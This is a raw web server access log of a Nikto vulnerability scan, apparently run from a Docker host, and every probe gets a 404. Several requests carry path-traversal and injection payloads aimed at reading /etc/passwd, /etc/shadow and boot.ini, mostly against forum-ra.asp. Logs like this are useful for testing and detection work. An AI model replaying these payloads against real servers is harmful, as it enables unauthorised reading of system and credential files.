172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smbcfg.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002231)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smconf.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002232)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smency.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002233)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smmsg.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002234)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smquar.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002235)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smsolar.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002236)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtime.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002237)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtp.box HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002238)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtp.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002239)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtpibwq.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002240)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtpobwq.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002241)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smtptbls.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002242)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /smvlog.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002243)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /software.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002244)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /srvnam.htm HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002245)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /statmail.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002246)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stauths.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002247)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stautht.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002248)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stconf.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002249)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stconfig.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002250)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stdnaset.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002251)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stdomino.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002252)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stlog.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002253)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /streg.nsf HTTP/1.1" 404 464 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002254)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /stsrc.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002255)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /test.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002256)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /today.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002257)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /userreg.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002258)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /users.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002259)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /vpuserinfo.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002260)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /web.nsf HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002261)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /webuser.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002262)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /welcome.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002263)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /wksinst.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002264)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /finance.xls HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002265)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /finances.xls HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002266)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /abonnement.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002267)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /acartpath/signin.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002268)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /add_acl HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002269)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admbrowse.php?down=1&amp;cur=%2Fetc%2F&amp;dest=passwd&amp;rid=1&amp;S=[someid] HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002270)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/auth.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002271)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/cfg/configscreen.inc.php+ HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002272)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/cfg/configsite.inc.php+ HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002273)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/cfg/configsql.inc.php+ HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002274)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/cfg/configtache.inc.php+ HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002275)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/cms/htmltags.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002276)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/credit_card_info.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002277)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/exec.php3 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002278)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002279)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/modules/cache.php+ HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002280)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/objects.inc.php4 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002281)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/script.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002282)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/settings.inc.php+ HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002283)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/templates/header.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002284)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin/upload.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002285)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /admin_t/include/aff_liste_langue.php HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002286)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /adv/gm001-mc/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002287)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /aff_news.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002288)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /approval/ts_app.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002289)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /archive.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002290)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /archive_forum.asp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002291)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ashnews.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002292)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /auth.inc.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002293)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /b2-tools/gm-2-b2.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002294)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /bandwidth/index.cgi HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002295)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /basilix.php3 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002296)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /bigsam_guestbook.php?displayBegin=9999...9999 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002297)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /bin/common/user_update_passwd.pl HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002298)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /biztalktracking/RawCustomSearchField.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002299)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /biztalktracking/rawdocdata.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002300)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /board/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002301)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /board/philboard_admin.asp+ HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002302)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /boilerplate.asp?NFuse_Template=../../boot.ini&amp;NFuse_CurrentFolder=/SSLx0020Directories|-|0|404_Object_Not_Found HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002303)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /bugtest+/+ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002304)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /caupo/admin/admin_workspace.php HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002305)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ccbill/whereami.cgi HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002306)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /chat_dir/register.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002307)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /checkout_payment.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002308)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /communique.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002309)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /community/forumdisplay.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002310)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /community/index.php?analized=anything HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002311)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /community/member.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002312)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /compte.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002313)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /config/html/cnf_gi.htm HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002314)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /convert-date.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002315)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cp/rac/nsManager.cgi HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002316)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /CSNews.cgi?command=viewnews&database=none HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002317)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /csPassword.cgi?command=remove%20 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002318)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cutenews/comments.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002319)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cutenews/search.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002320)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /cutenews/shownews.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002321)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /Data/settings.xml+ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002322)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /database/metacart.mdb+ HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002323)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /db.php HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002324)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dbabble HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002325)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dcp/advertiser.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002326)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /defines.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002327)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dltclnt.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002328)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /doc/admin/index.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002329)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /docs/NED HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002330)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/files/index_table.php HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002331)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/projects/addedit.php HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002332)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/projects/view.php HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002333)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/projects/vw_files.php HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002334)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/tasks/addedit.php HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002335)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /dotproject/modules/tasks/viewgantt.php HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002336)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /do_map HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002337)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /do_subscribe HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002338)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /email.php HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002339)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /emml_email_func.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002340)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /emumail.cgi?type=.%00 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002341)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /entete.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002342)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /enteteacceuil.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002343)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /etc/shadow+ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002344)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /eventcal2.php.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002345)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ez2000/ezadmin.cgi HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002346)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ez2000/ezboard.cgi HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002347)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ez2000/ezman.cgi HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002348)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /faqman/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002349)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /filemanager/index.php3 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002350)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /filemgmt/brokenfile.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002351)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /filemgmt/singlefile.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002352)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /filemgmt/viewcat.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002353)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /filemgmt/visit.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002354)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /foro/YaBB.pl HTTP/1.1" 404 467 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002355)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002356)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=../../../../../../../../../etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002357)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002358)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=/../../../../../../../../../../../boot.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002359)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002360)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=/etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002361)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=/etc/passwd%00 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002362)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra.asp?n=c:\\boot.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002363)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=%60/etc/passwd%60 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002364)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002365)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=../../boot.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002366)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/....../boot.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002367)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002368)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/../../../../../../etc/passwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002369)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/../../../etc/passwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002370)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002371)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/etc/passwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002372)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=/etc/passwd%00 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002373)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum-ra_professionnel.asp?n=c:\\boot.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002374)"
